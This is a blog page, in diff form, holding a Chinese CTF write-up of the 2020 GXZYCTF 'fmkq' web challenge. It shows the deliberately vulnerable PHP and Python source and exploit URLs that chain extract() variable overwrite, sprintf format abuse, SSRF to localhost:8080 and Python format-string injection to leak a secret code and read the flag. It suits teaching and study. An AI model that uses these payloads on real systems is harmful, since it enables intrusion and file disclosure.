@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="64x64" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/48x48.png">
+  <link rel="mask-icon" href="/images/logo1.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"boiteam.github.io","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="访问直接给了题目源码👇 12345678910111213141516171819202122232425262728293031323334 &lt;?phperror_reporting(0);if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;]))&amp;#123;    $begin &#x3D; &quot;The number you want: &quot;;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 GXZYCTF fmkq">
+<meta property="og:url" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/index.html">
+<meta property="og:site_name" content="BOI Team">
+<meta property="og:description" content="访问直接给了题目源码👇 12345678910111213141516171819202122232425262728293031323334 &lt;?phperror_reporting(0);if(isset($_GET[&#39;head&#39;])&amp;&amp;isset($_GET[&#39;url&#39;]))&amp;#123;    $begin &#x3D; &quot;The number you want: &quot;;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/image-20200309104345436.png">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105152178.png">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105248654.png">
+<meta property="og:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/0.png">
+<meta property="article:published_time" content="2020-03-09T01:52:20.000Z">
+<meta property="article:modified_time" content="2020-03-20T08:42:25.216Z">
+<meta property="article:author" content="BOI Team">
+<meta property="article:tag" content="Web_SSRF">
+<meta property="article:tag" content="Web_Python格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/image-20200309104345436.png">
+
+<link rel="canonical" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>2020 GXZYCTF fmkq | BOI Team</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BOI Team" type="application/atom+xml">
+</head>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BOI Team</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020 GXZYCTF fmkq
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-09 09:52:20" itemprop="dateCreated datePublished" datetime="2020-03-09T09:52:20+08:00">2020-03-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-20 16:42:25" itemprop="dateModified" datetime="2020-03-20T16:42:25+08:00">2020-03-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>访问直接给了题目源码👇</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>;</span></span><br><span class="line"><span class="php">    extract($_GET);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span></span><br><span class="line">        die('Head can\'t be like this!');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/log/i',$url))&#123;</span><br><span class="line">        die('No No No');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123;</span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ch = $funcname();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>关键就是触发curl了，参考<a href="https://www.php.net/manual/zh/function.sprintf" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.sprintf</a> 通过extract进行变量覆盖，覆盖begin为begin=%1$s，则<code>sprintf($begin.&#39;%d&#39;,$output);</code>处就可以输出，例如构造</p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?head</span>=\&amp;begin=<span class="meta">%1</span><span class="variable">$s</span>&amp;url=www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>则可以返回baidu的内容，所以显然用来SSRF最合适不过，发现127.0.0.1还开了8080端口，所以构造</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;begin</span>=%<span class="number">1</span>$s<span class="variable">&amp;url</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309104345436.png" alt></p>
+<p>也就是需要我们拿到vipcode，一通测试，python的格式化字符串问题，构造</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\&amp;begin=%1$s&amp;url=<span class="link">http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__</span>[<span class="string">vip</span>]._<span class="emphasis">_init_</span><span class="emphasis">_._</span><span class="emphasis">_globals_</span><span class="emphasis">_&#125;%26vipcode=xxx</span></span><br></pre></td></tr></table></figure>
+
+<p>可以读取到vipcode</p>
+<p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105152178.png" alt></p>
+<p>带上vipcode就可以为所欲为了</p>
+<p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105248654.png" alt></p>
+<p>提示了flag所在的文件，结合题目提示，flag的路径就是/fl4g_1s_h3re_u_wi11_rua/flag，读取题目源码可以发现fl4g被过滤了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#readfile.py</span></span><br><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vip.py</span></span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        global vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span><span class="symbol">:</span></span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.truevipcode</span><br></pre></td></tr></table></figure>
+
+<p>由于fl4g被过滤了，所以只能另辟蹊径，代码中</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">global</span> <span class="string">current_folder_file</span></span><br><span class="line"><span class="attr">try</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">os.listdir(self.path)</span></span><br><span class="line"><span class="attr">except</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">current_folder_file</span></span><br></pre></td></tr></table></figure>
+
+<p>所以可以通过current_folder_file来获取flag文件夹，构造</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;vipfile.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">current_folder_file</span>][<span class="symbol">21</span>]&#125;/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/09/2020_GXZYCTF_fmkq/0.png" alt>            </p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+    <div class="social-list">
+            <div class="social-item">
+              <a target="_blank" class="social-link" href="/atom.xml">
+                <span class="icon">
+                  <i class="fa fa-rss"></i>
+                </span>
+                <span class="label">RSS</span>
+              </a>
+            </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web-SSRF/" rel="tag"><i class="fa fa-tag"></i> Web_SSRF</a>
+              <a href="/tags/Web-Python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"><i class="fa fa-tag"></i> Web_Python格式化字符串</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/09/2020_GXZYCTF_northardweb/" rel="prev" title="2020 GXZYCTF NORTHWRD">
+      <i class="fa fa-chevron-left"></i> 2020 GXZYCTF NORTHWRD
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/09/2020_GXZYCTF_webtmp/" rel="next" title="2020 GXZYCTF webtmp">
+      2020 GXZYCTF webtmp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BOI Team"
+      src="/images/header.png">
+  <p class="site-author-name" itemprop="name">BOI Team</p>
+  <div class="site-description" itemprop="description">Because Of Interest</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
